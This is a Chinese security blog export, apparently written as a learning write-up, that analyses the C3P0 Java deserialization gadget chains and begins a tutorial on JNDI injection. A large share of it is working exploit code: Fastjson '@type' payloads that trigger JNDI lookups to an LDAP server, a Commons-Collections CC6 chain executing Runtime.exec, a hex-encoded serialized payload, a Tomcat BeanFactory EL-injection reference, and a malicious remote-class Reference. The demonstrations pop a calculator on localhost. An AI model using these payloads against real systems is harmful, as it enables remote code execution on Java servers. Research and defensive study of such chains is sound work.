参考资料https://www.freebuf.com/vuls/343387.htmlhttps://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化之C3P0链","url":"/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/","content":"Java C3P0 链\n\nJava 反序列化之 C3P0 链学习0x01 前言再多打一点基础吧，后续打算先看一看 XStream，Weblogic，strusts2 这些个\n0x02 C3P0 组件介绍C3P0 是一个开源的 JDBC 连接池，它实现了数据源和 JNDI 绑定，支持 JDBC3 规范和 JDBC2 的标准扩展。目前使用它的开源项目有 Hibernate，Spring 等。\nJDBC 是 Java DataBase Connectivity 的缩写，它是 Java 程序访问数据库的标准接口。  \n使用Java程序访问数据库时，Java 代码并不是直接通过 TCP 连接去访问数据库，而是通过 JDBC 接口来访问，而 JDBC 接口则通过 JDBC 驱动来实现真正对数据库的访问。\n连接池类似于线程池，在一些情况下我们会频繁地操作数据库，此时Java在连接数据库时会频繁地创建或销毁句柄，增大资源的消耗。为了避免这样一种情况，我们可以提前创建好一些连接句柄，需要使用时直接使用句柄，不需要时可将其放回连接池中，准备下一次的使用。类似这样一种能够复用句柄的技术就是池技术。\n\n简单来说，C3P0 属于 jdbc 的一部分，和 Druid 差不多\n\n0x03 C3P0 反序列化漏洞环境jdk8u65\npom.xml 如下\n&lt;dependency>\n    &lt;groupId>com.mchange&lt;/groupId>\n    &lt;artifactId>c3p0&lt;/artifactId>\n    &lt;version>0.9.5.2&lt;/version>\n&lt;/dependency>\n\nC3P0 反序列化三条 Gadgets\n在去复现链子之前，既然这是一个数据源的组件，那么大概率会存在的漏洞是 URLClassLoader 的类的动态加载，还有 Jndi 注入。\n\n好叭看了其他师傅的文章才知道，C3P0 常见的利用方式有如下三种\n\nURLClassLoader 远程类加载\nJNDI 注入\n利用 HEX 序列化字节加载器进行反序列化攻击（第一次见，应该是我少见多怪了\n\n我们还是以漏洞发现者的角度来复现一遍，尝试着能否少看一些其他师傅的文章，较为独立的找到链子。\nC3P0 之 URLClassLoader 的链子C3P0 之 URLClassLoader 流程分析我们先想一想，既然是 URLClassLoader 的链子，什么场景下会用到 URLClassLoader 的链子呢？\n我的第一想法是，获取数据源很可能是通过 URLClassLoader 的，事实证明我的这种想法非常愚蠢，因为获取数据源并不是获取一个类。当然，最终也没找到，不过也是有点收获的。\n后面又想到了，可能是 Ref 这种类型的类，于是我又回头找了一下，但是因为 IDEA 未能搜索依赖库内的内容，所以就寄了，直接看了其他师傅的文章。\n找到的类是 ReferenceableUtils，当中的 referenceToObject() 方法调用了 URLClassLoader 加载类的方法\n\n\n最后还有类的加载 ———— instance()，我们的链子尾部就找好了。\n继续往上找，应该是去找谁调用了 ReferenceableUtils.referenceToObject()\n\n\nReferenceIndirector 类的 getObject() 方法调用了 ReferenceableUtils.referenceToObject()，继续往上找\n\n\nPoolBackedDataSourceBase#readObject() 调用了 ReferenceIndirector#getObject()，同时这也正好是一个入口类。\n总结链子流程图如图\n\n\nC3P0 之 URLClassLoader EXP 编写手写一遍 EXP 试试\n先写 ReferenceableUtils.referenceToObject() 的 URLClassLoader 的 EXP。EXP 如下\npublic class RefToURLClassLoader &#123;  \n    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, NamingException, InstantiationException &#123;  \n        Class clazz = Class.forName(\"com.mchange.v2.naming.ReferenceableUtils\");  \n        Reference reference = new Reference(\"Calc\", \"Calc\",\"http://127.0.0.1:9999/\");  \n        Method method = clazz.getDeclaredMethod(\"referenceToObject\", Reference.class, Name.class, Context.class, Hashtable.class);  \n        method.setAccessible(true);  \n        Object o = method.invoke(clazz, reference, null, null, null);  \n        Object object = method.invoke(o, null, null, null, null);  \n    &#125;  \n&#125;\n\n\n\n\n\n继续往前走，去看一下 PoolBackedDataSourceBase#readObject() 方法\n\n这里的 readObject() 方法想要进到链子的下一步 getObject() 必须要满足一个条件，也就是传入的类必须要是 IndirectlySerialized 这个类。\n在进行完这个判断之后\nthis.connectionPoolDataSource = (ConnectionPoolDataSource) o;\n\n执行 .getObject() 方法的类从原本的 PoolBackedDataSourceBase 变成了 ConnectionPoolDataSource，但是 ConnectionPoolDataSource 是一个接口，并且没有继承 Serializable 接口，所以是无法直接用于代码里面的。\n\n\n\n这个地方有点卡住了，我们不妨去看一下 PoolBackedDataSourceBase#writeObject() 的时候，也就是序列化的时候做了什么\n\n如图，直接包装了一层 indirector.indirectForm()\n\n\n我们跟进 indirector.indirectForm() 看一看，当然这个地方的 indirector 实际上就是 com.mchange.v2.naming.ReferenceIndirector，所以语句等价于\nReferenceIndirector.indirectForm()\n\n经过 ReferenceIndirector.indirectForm() 的 “淬炼”，我们直接看返回值是什么\n\n\n这里返回的是 ReferenceSerialized 的一个构造函数，ReferenceSerialized 实际上是一个内部类\n\n\n跟进一下继承的接口\n\n\n发现它继承了 Serializable 接口，至此，包装的过程分析结束。现在我们拿到的 “ConnectionPoolDataSource” 外表上还是 “ConnectionPoolDataSource”，但是实际上已经变成了 “ReferenceSerialized” 这个类；事后师傅们可以自行打断点调试，这样体会的更深刻一些。\nEXP 的编写也较为简单，值得一提的是，这里面有一个 getReference() 方法可以直接 new 一个 Reference 对象。\n通过反射修改 connectionPoolDataSource 属性值为我们的恶意 ConnectionPoolDataSource 类\n\n\nC3P0 之 JNDI 注入误打误撞看到的一处伪 JNDI 注入，失败告终虽然是误打误撞看到的，也是失败的，但是依然有价值。后面看了枫师傅的博客，发现这里居然还是可以利用的，简直太强了。\n\n其实是在寻找上一条 Gadget 的时候发现的\n\n位置在这个地方 com.mchange.v2.naming.ReferenceIndirector\n它的 getObject() 方法里面有 initialContext.lookup()\n所以我尝试了一下发现几个问题，虽然是坑吧，但是这个坑我更愿意称之为尝试。\n首先这里，我们如果要触发 JNDI 注入，那么肯定需要控制 contextName 这个属性值，结果好巧不巧，这个属性值是一个类\n\n\n\n\n既然是一个类，就不能直接赋给字符串对象，然后我尝试了它接口的实现类，发现不行，只能是自己这个接口；这利用面感觉太小太小了，很难挖；所以我这里就放弃了。\n\n也挂一手失败的 EXP 吧\n\npublic class Test &#123;  \n    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, NoSuchFieldException, IllegalAccessException, InstantiationException, InvocationTargetException, InvalidNameException &#123;  \n        Class clazz = Class.forName(\"com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized\");  \n        Method method = clazz.getDeclaredMethod(\"getObject\");  \n        Field ContextField = clazz.getDeclaredField(\"contextName\");  \n        ContextField.setAccessible(true);  \n        DnsName dnsName = new DnsName();  \n        ContextField.set(dnsName,dnsName);  \n        Object o = method.invoke(clazz);  \n        method.invoke(o);  \n    &#125;  \n&#125;\n\n挺有意思的一次尝试，哈哈哈哈。\nC3P0 之 JNDI 注入流程分析这条链子是基于 Fastjson 链子的，也就是说，是 Fastjson 的某一条链\n我们还是以漏洞发现者的思维去寻找，在库中全局搜索 Jndi，看看是否有收获\n\n\n点开第一个试一下，接着在这个类当中找 jndi 关键词，看到了这个方法：dereference()\n\n\n\n在第 112 行与第 114 行，有非常惹人注目的 ctx.lookup()\n\n这里被 lookup() 的变量是 jndiName，跟进去看一下 jndiName 是什么\n\n\njndiName 是由 this.getJndiName() 搞来的，跟进看一看 getJndiName() 方法\n\n\n这个方法做了一件什么事呢？它判断了拿进来的 jndiName 是不是 Name 的类型，如果是就返回 ((Name) jndiName).clone()，若不是就返回 String；回想起我前文挖洞失败的那个经历，不就是因为传参是一个对象所以无法利用吗！\n我这里的运气非常好，第一次找就找到了这个漏洞类\n回到前面，我们看一下 dereference() 方法，是否允许我们传入一个 String 类型的参数\n\n\n至此，链子的尾部已经是没问题的了，向上找可用的地方\n\n\n同一个类下的 inner() 方法调用了它，继续往上找\n\n\n这里有非常多的 getter/setter 方法，已经是满足作为 fastjson 调用链的条件了，但是对于选择上来说，我们选最简单的 setLoginTimeout() 方法，因为它的传参只需要我们传入一个整数即可。\n我觉得这里已经可以写 EXP 了，但是看到有其他师傅的文章分析的意思是：还要继续向上找，可能是因为这个 JndiRefForwardingDataSource 类是 default 的类，觉得利用面还是不够大吧，我个人觉得从攻击的角度上来说是都可以的，后续在写 EXP 的环节也会把这个写进去。\n\n如果要继续网上找的话，还有一个是可以利用的类\n\n\n\n再向上找可能还是可以，还能利用，但已经完全没必要了。因为黑命单加的都是大类，如果简短的链子被 ban 了，再深的链子也是被 ban 的。\nC3P0 之 JNDI EXP 构造先导入 fastjson 的包，就先导 1.2.24 的吧，因为 1.2.25 版本的 fastjson 当中就已经把 com.mchange 包加入了黑名单里面。\n&lt;dependency>  \n    &lt;groupId>com.alibaba&lt;/groupId>  \n    &lt;artifactId>fastjson&lt;/artifactId>  \n    &lt;version>1.2.24&lt;/version>  \n&lt;/dependency>\n\nJndiRefForwardingDataSource 的 EXP 如下\npackage JNDIVul;  \n  \nimport com.alibaba.fastjson.JSON;  \n  \n// JndiRefForwardingDataSource 类的直接 EXP 调用  \npublic class JndiForwardingDataSourceEXP &#123;  \n    public static void main(String[] args) &#123;  \n        String payload = \"&#123;\\\"@type\\\":\\\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\\\",\" +  \n                \"\\\"jndiName\\\":\\\"ldap://127.0.0.1:1230/remoteObject\\\",\\\"LoginTimeout\\\":\\\"1\\\"&#125;\";  \n        JSON.parse(payload);  \n    &#125;  \n&#125;\n\n因为是 default 作用域的类，所以不可以直接 new，这里我们直接用 fastjson 的方式去调\n\n\nJndiRefConnectionPoolDataSource 的 EXP 也大同小异，因为这是个 public 为作用域的类，我们可以先通过这种方式测试一下链子的可用性。\npublic class JndiRefConnectionPoolDataSourceTest &#123;  \n    public static void main(String[] args) throws PropertyVetoException, SQLException &#123;  \n        JndiRefConnectionPoolDataSource jndiRefConnectionPoolDataSource = new JndiRefConnectionPoolDataSource();  \n        jndiRefConnectionPoolDataSource.setJndiName(\"ldap://127.0.0.1:1230/remoteObject\");  \n        jndiRefConnectionPoolDataSource.setLoginTimeout(1);  \n    &#125;  \n&#125;\n\n\n\n\n用 fastjson 打也比较简单\n\npublic class JndiRefConnectionPoolDataSourceEXP &#123;  \n    public static void main(String[] args) &#123;  \n        String payload = \"&#123;\\\"@type\\\":\\\"com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\\\",\" +  \n                \"\\\"jndiName\\\":\\\"ldap://127.0.0.1:1230/remoteObject\\\",\\\"LoginTimeout\\\":\\\"1\\\"&#125;\";  \n        JSON.parse(payload);  \n    &#125;  \n&#125;\n\n成功\n\n\nC3P0 之 hexbase 攻击利用\n这个点因为之前从来没有接触到过，所以跟着其他师傅的文章学习一下，同时这一种利用方式也是二次反序列化的利用之一。\n\nC3P0 之 hexbase 流程分析这条链子能成立的根本原因是，有一个WrapperConnectionPoolDataSource 类，它能够反序列化一串十六进制字符串\n链子首部是在 WrapperConnectionPoolDataSource 类的构造函数中，如图\n\n\n在给 userOverrides 赋值的时候，用的是 C3P0ImplUtils.parseUserOverridesAsString() 这么一个操作，这个方法的作用就是反序列化 userOverride 把它这个 String 类型的东西转为对象。跟进\n\n\n它这里把 hex 字符串读了进来，把转码后的结果保存到了 serBytes 这个字节流的数组中，这个字节流是拿去进行 SerializableUtils.fromByteArray() 的操作，值得注意的是，在解析过程中调用了 substring() 方法将字符串头部的 HASM_HEADER 截去了，因此我们在构造时需要在十六进制字符串头部加上 HASM_HEADER，并且会截去字符串最后一位，所以需要在结尾加上一个;\n\n\nSerializableUtils#fromByteArray() 调用了 SerializableUtils#deserializeFromByteArray，跟进，看到了反序列化的操作 ———— readObject()\n\n\nC3P0 之 hexbase EXP 编写\n因为我们在链子的第一步的时候，看到传入的参数是 this.getUserOverridesAsString()，所以用 Fastjson 的链子打会很简单。\n\n这里我们需要写一个构造 hex 的 EXP，调用之前学 CC 链就可以\nEXP 如下\npackage hexBase;  \n  \nimport com.alibaba.fastjson.JSON;  \nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.keyvalue.TiedMapEntry;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport java.beans.PropertyVetoException;  \nimport java.io.ByteArrayOutputStream;  \nimport java.io.IOException;  \nimport java.io.ObjectOutputStream;  \nimport java.io.StringWriter;  \nimport java.lang.reflect.Field;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \npublic class HexBaseFastjsonEXP &#123;  \n  \n    //CC6的利用链  \n public static Map CC6() throws NoSuchFieldException, IllegalAccessException &#123;  \n        //使用InvokeTransformer包装一下  \n Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(Runtime.class),  \n                new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", null&#125;),  \n                new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),  \n                new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)  \n        &#125;;  \n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n        HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n        Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer(\"five\")); // 防止在反序列化前弹计算器  \n TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"key\");  \n        HashMap&lt;Object, Object> expMap = new HashMap&lt;>();  \n        expMap.put(tiedMapEntry, \"value\");  \n        lazyMap.remove(\"key\");  \n  \n        // 在 put 之后通过反射修改值  \n Class&lt;LazyMap> lazyMapClass = LazyMap.class;  \n        Field factoryField = lazyMapClass.getDeclaredField(\"factory\");  \n        factoryField.setAccessible(true);  \n        factoryField.set(lazyMap, chainedTransformer);  \n  \n        return expMap;  \n    &#125;  \n  \n  \n    static void addHexAscii(byte b, StringWriter sw)  \n    &#123;  \n        int ub = b &amp; 0xff;  \n        int h1 = ub / 16;  \n        int h2 = ub % 16;  \n        sw.write(toHexDigit(h1));  \n        sw.write(toHexDigit(h2));  \n    &#125;  \n  \n    private static char toHexDigit(int h)  \n    &#123;  \n        char out;  \n        if (h &lt;= 9) out = (char) (h + 0x30);  \n        else out = (char) (h + 0x37);  \n        //System.err.println(h + \": \" + out);  \n return out;  \n    &#125;  \n  \n    //将类序列化为字节数组  \n public static byte[] tobyteArray(Object o) throws IOException &#123;  \n        ByteArrayOutputStream bao = new ByteArrayOutputStream();  \n        ObjectOutputStream oos = new ObjectOutputStream(bao);  \n        oos.writeObject(o);  \n        return bao.toByteArray();  \n    &#125;  \n  \n    //字节数组转十六进制  \n public static String toHexAscii(byte[] bytes)  \n    &#123;  \n        int len = bytes.length;  \n        StringWriter sw = new StringWriter(len * 2);  \n        for (int i = 0; i &lt; len; ++i)  \n            addHexAscii(bytes[i], sw);  \n        return sw.toString();  \n    &#125;  \n  \n    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, PropertyVetoException &#123;  \n        String hex = toHexAscii(tobyteArray(CC6()));  \n        System.out.println(hex);  \n  \n        //Fastjson&lt;1.2.47  \n String payload = \"&#123;\" +  \n                \"\\\"1\\\":&#123;\" +  \n                \"\\\"@type\\\":\\\"java.lang.Class\\\",\" +  \n                \"\\\"val\\\":\\\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\\"\" +  \n                \"&#125;,\" +  \n                \"\\\"2\\\":&#123;\" +  \n                \"\\\"@type\\\":\\\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\\",\" +  \n                \"\\\"userOverridesAsString\\\":\\\"HexAsciiSerializedMap:\"+ hex + \";\\\",\" +  \n                \"&#125;\" +  \n                \"&#125;\";  \n        JSON.parse(payload);  \n  \n  \n    &#125;  \n&#125;\n\n在低版本 Fastjson 的情况下，实际上也可以使用下面的 Payload\nString payload &#x3D; &quot;&#123;&quot; +\n        &quot;\\&quot;@type\\&quot;:\\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\&quot;,&quot; +\n        &quot;\\&quot;userOverridesAsString\\&quot;:\\&quot;HexAsciiSerializedMap:&quot;+ hex + &quot;;\\&quot;,&quot; +\n        &quot;&#125;&quot;;\n\nC3P0 之 hexbase 调试分析\n断点位置如图\n\n\n\n因为我们第一次 Fastjson 拿进去打的是空，是用来加载的，第二次的 payload 是执行，所以可以直接跳过第一次的加载。\n\n\n当第二次 Fastjson 进来的时候，就有了\n\n\n在过了 substring 这一步之后，我们看到前面的：HexAsciiSerializedMap: 都无了，现在加载进来的才是真正的 hex 内容\n\n\n接着，把 hex 的内容转化为了 bytes 字节码\n\n\n下一步，进行反序列化\n\n\n跟进\n\n\n成功弹出计算器\nC3P0 之 hexbase 另类 EXP 调试分析\n在上文 EXP 的编写中，我提到了 “在低版本 Fastjson 的情况下，实际上也可以使用下面的 Payload”\n\n这到底是怎么一回事儿呢\n实际上 Fastjson 初始化 WrapperConnectionPoolDataSource 类时，userOverridesAsString 属性是空的，要想进行反序列化操作，必须先给其赋值。理论上来说，要想解析 userOverridesAsString 属性，至少需要调用两次构造函数。\n我们来调试看一下\n\n断点依旧是同一个位置，开始调试\n\n\n\n惊奇的发现，userOverrideAsString 一开始为 null，但是经过一轮之后，变成了 hex；这到底是为什么呢？我们可以去到 WrapperConnectionPoolDataSourceBase#setUserOverridesAsString 里面去看一看\n\n\n不妨在这个地方下个断点，然后调试一下。\n师傅们调试的时候会发现，这个\n\n\nsetUserOverridesAsString() 的运行逻辑大致是这样的，首先把之前为 null 的 userOverridesAsString 赋值给 oldVal，接着判断这两个是否相等，或者是否都为 null，如果不满足这个条件，就把新的值赋给 userOverridesAsString，如图\n\n\n后续的过程和前面一样，就不再分析了。\n0x04 C3P0 链子的不出网利用这一种攻击方式是向枫师傅学到的\n不论是 URLClassLoader 加载远程类，还是 JNDI 注入，都需要目标机器能够出网。\n而加载 Hex 字符串的方式虽然不用出网，但却有 Fastjson 等的相关依赖。那么如果目标机器不出网，又没有 Fastjson 依赖的话，C3P0 链又该如何利用呢？\n\n关于 Java 的链子，如何不出网利用一直是一个很有趣的话题，也是很有意思的攻击面。\n\n在 Jndi 高版本利用中，我们可以加载本地的 Factory 类进行攻击，而利用条件之一就是该工厂类至少存在一个 getObjectInstance() 方法。比如通过加载 Tomcat8 中的 org.apache.naming.factory.BeanFactory 进行 EL 表达式注入；关于 EL 表达式注入可以看这篇 Java 之 EL 表达式注入\n先导入依赖\n&lt;dependency>  \n    &lt;groupId>org.apache.tomcat&lt;/groupId>  \n    &lt;artifactId>tomcat-catalina&lt;/artifactId>  \n    &lt;version>8.5.0&lt;/version>  \n&lt;/dependency>  \n&lt;dependency>  \n    &lt;groupId>org.apache.tomcat.embed&lt;/groupId>  \n    &lt;artifactId>tomcat-embed-el&lt;/artifactId>  \n    &lt;version>8.5.15&lt;/version>  \n&lt;/dependency>\n\nC3P0 链子的不出网利用分析与 EXP已经确定是想通过 EL 表达式注入的方式攻击了，我们需要先选择攻击的链子。\nJndi 的链子比较难，限制非常多，而且是不出网的利用，所以 pass 了；\nURLClassLoader 的链子是可行的，只需要我们把之前 URLClassLoader 的 EXP 进行一些修改即可。\nHexBase 的链子也是不可行的，因为它是基于 Fastjson 的一条链子。\nEXP 如下\npackage NoNetUsing;  \n  \nimport com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;  \nimport org.apache.naming.ResourceRef;  \n  \nimport javax.naming.NamingException;  \nimport javax.naming.Reference;  \nimport javax.naming.Referenceable;  \nimport javax.naming.StringRefAddr;  \nimport javax.sql.ConnectionPoolDataSource;  \nimport javax.sql.PooledConnection;  \nimport java.io.*;  \nimport java.lang.reflect.Field;  \nimport java.sql.SQLException;  \nimport java.sql.SQLFeatureNotSupportedException;  \nimport java.util.logging.Logger;  \n  \npublic class NoAccessEXP &#123;  \n  \n    public static class Loader_Ref implements ConnectionPoolDataSource, Referenceable &#123;  \n  \n        @Override  \n public Reference getReference() throws NamingException &#123;  \n            ResourceRef resourceRef = new ResourceRef(\"javax.el.ELProcessor\", (String)null, \"\", \"\", true, \"org.apache.naming.factory.BeanFactory\", (String)null);  \n            resourceRef.add(new StringRefAddr(\"forceString\", \"faster=eval\"));  \n            resourceRef.add(new StringRefAddr(\"faster\", \"Runtime.getRuntime().exec(\\\"calc\\\")\"));  \n            return resourceRef;  \n        &#125;  \n  \n        @Override  \n public PooledConnection getPooledConnection() throws SQLException &#123;  \n            return null;  \n        &#125;  \n  \n        @Override  \n public PooledConnection getPooledConnection(String user, String password) throws SQLException &#123;  \n            return null;  \n        &#125;  \n  \n        @Override  \n public PrintWriter getLogWriter() throws SQLException &#123;  \n            return null;  \n        &#125;  \n  \n        @Override  \n public void setLogWriter(PrintWriter out) throws SQLException &#123;  \n  \n        &#125;  \n  \n        @Override  \n public void setLoginTimeout(int seconds) throws SQLException &#123;  \n  \n        &#125;  \n  \n        @Override  \n public int getLoginTimeout() throws SQLException &#123;  \n            return 0;  \n        &#125;  \n  \n        @Override  \n public Logger getParentLogger() throws SQLFeatureNotSupportedException &#123;  \n            return null;  \n        &#125;  \n    &#125;  \n  \n    //序列化  \n public static void serialize(ConnectionPoolDataSource c) throws NoSuchFieldException, IllegalAccessException, IOException &#123;  \n        //反射修改connectionPoolDataSource属性值  \n PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);  \n        Class cls = poolBackedDataSourceBase.getClass();  \n        Field field = cls.getDeclaredField(\"connectionPoolDataSource\");  \n        field.setAccessible(true);  \n        field.set(poolBackedDataSourceBase,c);  \n  \n        //序列化流写入文件  \n FileOutputStream fos = new FileOutputStream(new File(\"ser.bin\"));  \n        ObjectOutputStream oos = new ObjectOutputStream(fos);  \n        oos.writeObject(poolBackedDataSourceBase);  \n  \n    &#125;  \n  \n    //反序列化  \n public static void unserialize() throws IOException, ClassNotFoundException &#123;  \n        FileInputStream fis = new FileInputStream(new File(\"ser.bin\"));  \n        ObjectInputStream objectInputStream = new ObjectInputStream(fis);  \n        objectInputStream.readObject();  \n    &#125;  \n  \n    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;  \n        Loader_Ref loader_ref = new Loader_Ref();  \n        serialize(loader_ref);  \n        unserialize();  \n    &#125;  \n&#125;\n\n把原来 URLClassLoader 的地方修改成 EL 表达式的命令执行即可。\nC3P0 链子的不出网利用调试\n简单调试理解一下。\n\n先把断点下在 BeanFactory 的 getObjectInstance() 方法下，因为这里是一定被调用到的。\n\n\n此处，我们可以看到之前的调用链，如图\n\n\n我们去到 readObject() 方法的地方加一个断点，再重新跑一遍，简单调试一下，我们就可以看到这是一个 URLClassLoader 的链子。\n\n\n\n此处进行了命令执行的操作\n\n\n\n0x05 小结C3P0 这条链子分析起来还是不难，建议师傅们可以动手去尝试一个个类看一下，看哪里可能会存在有漏洞。\n同时 C3P0 链的价值也是非常高的，C3P0 的包在实战环境中除CommonsCollections、CommonsBeanutiles 以外遇到最多的 JAR 包，其中一部分 C3P0 是被 org.quartz-scheduler:quartz 所依赖进来的。\n关于前文提到的 **”误打误撞看到的一处伪 JNDI 注入，失败告终”**，后续文章会仔细讲这一片段。对应的有一道例题 Dest0g3 520迎新赛——ljctr\n0x06 参考资料https://www.cnblogs.com/nice0e3/p/15058285.htmlhttps://tttang.com/archive/1411/#toc_urlclassloaderhttps://goodapple.top/archives/1749\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化之JNDI学习","url":"/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/","content":"Java Jndi 注入学习\n\n\n\n主要分为几个部分吧，这里就合并到一起写了。\n\nJava 反序列化之 JNDI 学习\n为什么说是 “从文档开始的 jndi 注入之路”\n\n因为 jndi 的内容比较多，我们从官方文档去看，专挑和安全有关系的地方看。\n官方文档地址：https://docs.oracle.com/javase/tutorial/jndi/overview/index.html\n0x01 什么是 jndi首先第一个问题，什么是 JNDI，它的作用是什么？\n根据官方文档，JNDI 全称为 Java Naming and Directory Interface，即 Java 名称与目录接口。也就是一个名字对应一个 Java 对象。\n也就是一个字符串对应一个对象。\njndi 在 jdk 里面支持以下四种服务\n\nLDAP：轻量级目录访问协议\n通用对象请求代理架构(CORBA)；通用对象服务(COS)名称服务\nJava 远程方法调用(RMI) 注册表\nDNS 服务\n\n前三种都是字符串对应对象，DNS 是 IP 对应域名。\njndi 的代码以及包说明JNDI 主要是上述四种服务，对应四个包加一个主包JNDI 接口主要分为下述 5 个包:\n\njavax.naming\njavax.naming.directory\njavax.naming.event\njavax.naming.ldap\njavax.naming.spi\n\n其中最重要的是 javax.naming 包，包含了访问目录服务所需的类和接口，比如 Context、Bindings、References、lookup 等。 以上述打印机服务为例，通过 JNDI 接口，用户可以透明地调用远程打印服务，伪代码如下所示:\nContext ctx = new InitialContext(env);\nPrinter printer = (Printer)ctx.lookup(\"myprinter\");\nprinter.print(report);\n\nJndi 在对不同服务进行调用的时候，会去调用 xxxContext 这个类，比如调用 RMI 服务的时候就是调的 RegistryContext，这一点是很重要的，记住了这一点对于 JNDI 这里的漏洞理解非常有益。\n一般的应用也就是先 new InitialContext()，再调用 API 即可，下面我们先看一个 JNDI 结合 RMI 的代码实例。\n0x02 JNDI 的利用方式，代码以及一些漏洞1. Jndi 结合 RMI新建一个项目，把服务端和客户端分开，代码如下。\n\nRemoteObj 的接口以及接口的实现类和 RMI 里面都是一样的，这里就不贴了。\n\nJNDIRMIServer.java\nimport javax.naming.InitialContext;  \nimport java.rmi.registry.LocateRegistry;  \nimport java.rmi.registry.Registry;  \n  \npublic class JNDIRMIServer &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        InitialContext initialContext = new InitialContext();  \n Registry registry = LocateRegistry.createRegistry(1099);  \n initialContext.rebind(\"rmi://localhost:1099/remoteObj\", new RemoteObjImpl());  \n &#125;  \n&#125;\n\nJNDIRMIClient.java\nimport javax.naming.InitialContext;  \n  \npublic class JNDIRMIClient &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        InitialContext initialContext = new InitialContext();  \n RemoteObj remoteObj = (RemoteObj) initialContext.lookup(\"rmi://localhost:1099/remoteObj\");  \n System.out.println(remoteObj.sayHello(\"hello\"));  \n &#125;  \n&#125;\n\nRMI 原生漏洞这里的 api 虽然是 JNDI 的服务的，但是实际上确实调用到 RMI 的库里面的，这里我们先打断点调试一下，证明 JNDI 的 api 实际上是调用了 RMI 的库里原生的 lookup() 方法。\n这里先分析一边，后续我们再到这个过程的时候就光速跳过了 ~\n断点的话，下一个在 InitialContext.java 的 lookup() 方法这里即可，开始调试。\n\n\n进到 lookup() 方法里面进去，这里 GenericURLContext 类的 lookup() 方法里面又套了一个 lookup() 方法，我们继续进去。\n\n\n进去之后发现这个类是 RegistryContext，也就是 RMI 对应 lookup() 方法的类，至此，可以基本说明JNDI 调用 RMI 服务的时候，虽然 API 是 JNDI 的，但是还是去调用了原生的 RMI 服务。\n\n\n\n所以说，如果 JNDI 这里是和 RMI 结合起来使用的话，RMI 中存在的漏洞，JNDI 这里也会有。但这并不是 JNDI 的传统意义上的漏洞。\n\n引用的漏洞，Normal Jndi\n这个漏洞被称作 Jndi 注入漏洞，它与所调用服务无关，不论你是 RMI，DNS，LDAP 或者是其他的，都会存在这个问题。\n\n原理是在服务端调用了一个 Reference 对象，我个人的理解，它是很像代理的。\n代码如下\nimport javax.naming.InitialContext;  \nimport javax.naming.Reference;  \nimport java.rmi.registry.LocateRegistry;  \nimport java.rmi.registry.Registry;  \n  \npublic class JNDIRMIServer &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        InitialContext initialContext = new InitialContext();  \n Registry registry = LocateRegistry.createRegistry(1099);  \n // RMI  \n // initialContext.rebind(\"rmi://localhost:1099/remoteObj\", new RemoteObjImpl()); // JNDI 注入漏洞  \n Reference reference = new Reference(\"Calc\",\"Calc\",\"http://localhost:7777/\");  \n initialContext.rebind(\"rmi://localhost:1099/remoteObj\", reference);  \n &#125;  \n&#125;\n\n我们看到这个地方，原本我们是这样的\ninitialContext.rebind(\"rmi://localhost:1099/remoteObj\", new RemoteObjImpl());\n\n直接是绑定了一个对象，而在 jndi 里面，我们可以通过 new 一个 Reference 类的方法来解决。然后再 rebind 调用它，这个思路有点像代理吧，然后调用它这个很像 URLClassLoader。有兴趣的师傅可以跟一下断点。\n如果要攻击的话，也很简单，我们在 URLClassLoader 这个获取的方法里面添加恶意类就可以了，比如我这里是 Calc.exe 这个恶意命令调用，代码如下\npublic class JndiCalc &#123;  \n    public JndiCalc() throws Exception &#123;  \n        Runtime.getRuntime().exec(\"calc\");  \n &#125;  \n&#125;\n\n用 Python 起一个服务器，然后再运行即可。\n\n\n报错的话是一定会报错的，因为服务端这里还是 sayHello 了，但是我们调用的那个远程 Class —————— reference 其实是没有 sayHello 这个方法的。\n这里我们可以打断点调试一下。\n\n断点打在 Client 中调用 lookup() 方法的地方，开始调试。\n\n因为漏洞点在 lookup() 方法这里，所以我们是要去看 lookup() 方法的一整个流程，看一下是怎么触发恶意类，然后命令执行的。\n跟进几个 lookup() 方法，直到去到 RMI 的原生的 lookup()，对应的类我也在前文提及过了，是 RegistryContext\n\n\n继续往下走，这里 var2 对应的是 obj 变量，把 Ref 